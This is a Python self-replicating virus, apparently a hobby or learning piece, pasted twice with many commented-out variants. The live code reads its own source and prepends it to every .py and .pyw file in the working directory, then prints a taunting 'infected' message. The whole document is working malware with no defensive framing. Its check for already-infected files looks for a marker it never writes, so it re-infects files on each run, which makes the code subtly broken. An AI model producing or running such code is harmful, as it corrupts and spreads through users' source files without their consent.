

# I AM VIRUS !

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False

#for line in lines:
    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
        #self_replicating_part = True
    #if not self_replicating_part:
        #virus_code.append(line)
    #if line == "# VIRUS SAYS BYE!\n":
        #break


for line in lines:
    if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break
python_files = glob.glob('*.py') + glob.glob('*.pyw')


#for line in lines:
    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
        #self_replicating_part = True
    #if not self_replicating_part:
        #virus_code.append(line)
#python_files = glob.glob('*.py') + glob.glob('*.pyw')


#for line in lines:
        #virus_code.append(line)
    #if line == "# VIRUS SAYS BYE!\n":
        #break
#python_files = glob.glob('*.py') + glob.glob('*.pyw')



#for file in python_files:
    #with open(file, 'r') as f:
        #file_code = f.readlines()
    #for line in file_code:
        #if line == "# VIRUS SAYS HI!\n":
            #infected = True
            #break


for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

#for file in python_files:
    #with open(file, 'r') as f:
        #file_code = f.readlines()
    #infected = False
        #if line == "# VIRUS SAYS HI!\n":
            #infected = True
            #break


#for file in python_files:
    #with open(file, 'r') as f:
        #file_code = f.readlines()
    #infected = False
    #for line in file_code:
        #if line == "# VIRUS SAYS HI!\n":
            #break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!



# I AM VIRUS !

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False

#for line in lines:
    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
        #self_replicating_part = True
    #if not self_replicating_part:
        #virus_code.append(line)
    #if line == "# VIRUS SAYS BYE!\n":
        #break


for line in lines:
    if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break
python_files = glob.glob('*.py') + glob.glob('*.pyw')


#for line in lines:
    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
        #self_replicating_part = True
    #if not self_replicating_part:
        #virus_code.append(line)
#python_files = glob.glob('*.py') + glob.glob('*.pyw')


#for line in lines:
        #virus_code.append(line)
    #if line == "# VIRUS SAYS BYE!\n":
        #break
#python_files = glob.glob('*.py') + glob.glob('*.pyw')



#for file in python_files:
    #with open(file, 'r') as f:
        #file_code = f.readlines()
    #for line in file_code:
        #if line == "# VIRUS SAYS HI!\n":
            #infected = True
            #break


for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

#for file in python_files:
    #with open(file, 'r') as f:
        #file_code = f.readlines()
    #infected = False
        #if line == "# VIRUS SAYS HI!\n":
            #infected = True
            #break


#for file in python_files:
    #with open(file, 'r') as f:
        #file_code = f.readlines()
    #infected = False
    #for line in file_code:
        #if line == "# VIRUS SAYS HI!\n":
            #break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
